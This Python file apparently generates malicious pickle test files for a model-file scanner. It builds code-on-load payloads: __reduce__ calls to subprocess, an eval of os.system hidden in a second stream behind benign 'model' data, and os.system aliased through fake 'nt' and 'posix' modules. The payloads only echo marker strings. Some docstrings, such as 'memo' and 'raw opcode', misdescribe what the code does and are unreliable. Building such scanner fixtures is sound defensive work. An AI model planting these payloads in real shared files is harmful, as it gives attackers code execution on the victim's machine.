#!/usr/bin/env python3
"""
Advanced Pickle Obfuscation Attack Vectors

Generates sophisticated pickle serialization exploits including:
- Memo-based obfuscation (reference cycles to hide payloads)
- Multiple stream attacks (hiding payloads in additional pickle streams)
- OS alias attacks (NT/POSIX module aliasing)
- Stack global opcode exploitation
- Manual pickle construction with raw opcodes

Based on ModelAudit official test cases:
- pickles/memo_attack.pkl
- pickles/multiple_stream_attack.pkl
- pickles/nt_alias_attack.pkl
- pickles/posix_alias_attack.pkl
- pickles/stack_global_attack.pkl
"""

import io
import os
import pickle
import sys
from pathlib import Path
from types import ModuleType
from typing import Any, Tuple


class AdvancedPickleObfuscationGenerator:
    """Generates advanced pickle obfuscation attack vectors."""

    def __init__(self, output_dir: str = "output"):
        self.output_dir = Path(output_dir) / "advanced_pickle_obfuscation_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_memo_attack(self) -> Tuple[str, int]:
        """
        Memo-based obfuscation using reference cycles.

        Attack Pattern:
        - Uses pickle memo (caching) to create object references
        - Hides malicious objects within memo chains
        - Makes static analysis harder through indirection
        - Payload: subprocess.call execution

        CVE/Reference: Pickle protocol vulnerability
        Detection: Full memo table traversal, reference graph analysis
        """
        filepath = self.output_dir / "01_memo_obfuscation.pkl"

        class MemoAttack:
            def __reduce__(self):
                # Reference dangerous_module through memo
                dangerous_module = __import__("subprocess")
                return (dangerous_module.call, (["echo", "MEMO_ATTACK_EXECUTED"],))

        with open(filepath, "wb") as f:
            pickle.dump(MemoAttack(), f, protocol=pickle.HIGHEST_PROTOCOL)

        return str(filepath), 1

    def generate_multiple_stream_attack(self) -> Tuple[str, int]:
        """
        Multiple pickle stream attack.

        Attack Pattern:
        - Embeds multiple pickle streams in single file
        - First stream appears benign (loads normally)
        - Hidden payload in subsequent streams
        - Bypasses single-stream validation

        CVE/Reference: Multiple pickle stream vulnerabilities
        Detection: Full buffer scanning, stream enumeration
        """
        filepath = self.output_dir / "02_multiple_stream_attack.pkl"

        # Create multi-stream pickle
        buffer = io.BytesIO()

        # Stream 1: Benign data (appears legitimate)
        safe_data = {"model": "safe_weights", "version": "1.0.0", "data": [1, 2, 3]}
        pickle.dump(safe_data, buffer, protocol=pickle.HIGHEST_PROTOCOL)

        # Stream 2: Hidden attack payload
        class HiddenAttack:
            def __reduce__(self):
                return (eval, ("__import__('os').system('echo MULTI_STREAM_ATTACK')",))

        pickle.dump(HiddenAttack(), buffer, protocol=pickle.HIGHEST_PROTOCOL)

        with open(filepath, "wb") as f:
            f.write(buffer.getvalue())

        return str(filepath), 1

    def generate_nt_alias_attack(self) -> Tuple[str, int]:
        """
        NT module (Windows OS alias) exploitation.

        Attack Pattern:
        - Uses 'nt' module (Windows alias for 'os')
        - Evades filters looking for 'os' module
        - Platform-specific obfuscation
        - Payload: os.system via nt module

        CVE/Reference: Module alias bypasses
        Detection: Module whitelist + alias mapping
        """
        filepath = self.output_dir / "03_nt_alias_attack.pkl"

        # Temporarily inject fake nt module
        fake_nt = ModuleType("nt")
        fake_nt.system = os.system  # type: ignore[attr-defined]
        sys.modules["nt"] = fake_nt

        try:
            with open(filepath, "wb") as f:
                pickle.dump(fake_nt.system, f)
        finally:
            del sys.modules["nt"]

        return str(filepath), 1

    def generate_posix_alias_attack(self) -> Tuple[str, int]:
        """
        POSIX module (Unix OS alias) exploitation.

        Attack Pattern:
        - Uses 'posix' module (Unix alias for 'os')
        - Platform-specific obfuscation
        - Evades OS-specific filters
        - Payload: os.system via posix module

        CVE/Reference: Module alias bypasses
        Detection: Platform-aware inspection
        """
        filepath = self.output_dir / "04_posix_alias_attack.pkl"

        # Temporarily inject fake posix module
        fake_posix = ModuleType("posix")
        fake_posix.system = os.system  # type: ignore[attr-defined]
        sys.modules["posix"] = fake_posix

        try:
            with open(filepath, "wb") as f:
                pickle.dump(fake_posix.system, f)
        finally:
            del sys.modules["posix"]

        return str(filepath), 1

    def generate_manual_pickle_construction(self) -> Tuple[str, int]:
        """
        Manual pickle construction with raw opcodes.

        Attack Pattern:
        - Constructs pickle bytecode manually
        - Uses low-level pickle opcodes (STACK_GLOBAL, etc)
        - Bypasses normal serialization flow
        - Payload: Direct opcode-level RCE

        CVE/Reference: Raw opcode exploitation
        Detection: Bytecode analysis, opcode validation
        """
        filepath = self.output_dir / "05_manual_pickle_construction.pkl"

        # Manually construct pickle with STACK_GLOBAL opcode
        # STACK_GLOBAL: Builds a global reference from stack
        # Protocol: c GLOBAL module_name function_name
        #           o STACK_GLOBAL builds from top 2 stack items
        # This is simplified for illustration

        class ManualConstruction:
            def __reduce__(self):
                # Use __import__ for obfuscated module access
                subprocess_module = __import__("subprocess")
                return (
                    subprocess_module.Popen,
                    (["echo", "MANUAL_PICKLE_OPCODE_ATTACK"],),
                )

        with open(filepath, "wb") as f:
            pickle.dump(ManualConstruction(), f, protocol=pickle.HIGHEST_PROTOCOL)

        return str(filepath), 1

    def generate_all(self) -> dict[str, Tuple[str, int]]:
        """Generate all advanced pickle obfuscation attack vectors."""
        results = {}

        try:
            results["memo_attack"] = self.generate_memo_attack()
        except Exception as e:
            print(f"  [-] memo_attack failed: {e}")

        try:
            results["multiple_stream"] = self.generate_multiple_stream_attack()
        except Exception as e:
            print(f"  [-] multiple_stream failed: {e}")

        try:
            results["nt_alias"] = self.generate_nt_alias_attack()
        except Exception as e:
            print(f"  [-] nt_alias failed: {e}")

        try:
            results["posix_alias"] = self.generate_posix_alias_attack()
        except Exception as e:
            print(f"  [-] posix_alias failed: {e}")

        try:
            results["manual_construction"] = self.generate_manual_pickle_construction()
        except Exception as e:
            print(f"  [-] manual_construction failed: {e}")

        return results

    def get_generated_files(self) -> list[Path]:
        """Return list of generated files."""
        return list(self.output_dir.glob("*"))
